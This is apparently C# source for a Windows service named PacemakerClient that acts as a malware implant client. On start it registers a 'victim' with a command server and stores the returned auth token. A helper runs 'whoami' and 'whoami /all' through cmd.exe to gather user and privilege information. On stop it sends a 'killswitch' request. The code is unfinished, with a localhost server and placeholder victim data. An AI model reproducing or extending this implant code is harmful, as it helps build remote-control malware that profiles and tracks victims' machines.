using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Net.Http;
using System.IO;
using System.Runtime.Serialization.Formatters.Binary;
using Newtonsoft.Json;

namespace PacemakerClient
{
    public partial class Service1 : ServiceBase
    {

        public static string server_hostname = "http://localhost:3000";
        public static BinaryFormatter bf;
        public static AuthCore authObj;
        static Stream file_stream;

        public Service1()
        {
            InitializeComponent();
        }

        public async static Task InitialHandshake()
        {
            HttpClient Client = new HttpClient();

            string victimName = "alskdjaldsk";
            string victimAdditionalinfo = "dummy info";

            string jsonData = "{\"victimName\": \"" + victimName + "\", \"victimAdditionalinfo\": \"" + victimAdditionalinfo + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PutAsync(server_hostname + "/core/initialhandshake", content);

            string jsonResponse;

            if (json.IsSuccessStatusCode)
            {
                jsonResponse = await json.Content.ReadAsStringAsync();

                authObj = JsonConvert.DeserializeObject<AuthCore>(jsonResponse);

                bf = new BinaryFormatter();
                Stream stream1;
                stream1 = File.Open("authObject.dat", FileMode.Open);       // serializing auth object
                bf.Serialize(stream1, authObj);
                stream1.Close();

            }

            // string fullPath = Environment.CurrentDirectory + "\\log.txt";

            /* using (StreamWriter writer = new StreamWriter(fullPath))
            {
                writer.WriteLine(json.ToString());
                writer.WriteLine(jsonResponse.ToString());
            }*/

        }

        public static string GetUserInfo(string option)
        {
            string result;

            if (option == "name")
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                process.StandardInput.WriteLine("whoami");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();


                result = process.StandardOutput.ReadToEnd();

                Console.WriteLine(result);
                Console.Write("Hit 1");
                return result;
            }
            else
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.RedirectStandardInput = true;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                process.StandardInput.WriteLine("whoami /all");
                process.StandardInput.Flush();
                process.StandardInput.Close();
                process.WaitForExit();


                result = process.StandardOutput.ReadToEnd();

                Console.WriteLine(result);
                Console.Write("Hit 2");
                return result;
            }
        }


        public async static Task KillSwitch()
        {
            HttpClient Client = new HttpClient();

            string jsonData = "{\"username\": \"" + authObj.Username + "\", \"jwt_key\": \"" + authObj.JwtToken + "\"}";

            var content = new StringContent(jsonData, Encoding.UTF8, "application/json");

            var json = await Client.PostAsync(server_hostname + "/core/killswitch", content);

            string fullPath = Environment.CurrentDirectory + "\\killed.txt";

            using (StreamWriter writer = new StreamWriter(fullPath))
            {
                var jsonResponse = await json.Content.ReadAsStringAsync();
                writer.WriteLine(jsonResponse.ToString());
                writer.WriteLine(json.ToString());
                writer.WriteLine("\n\nVictim was killed...");
            }

            return;
        }

        protected override async void OnStart(string[] args)
        {
            await InitialHandshake();
        }

        protected override async void OnStop()
        {
            await KillSwitch();
        }
    }
}
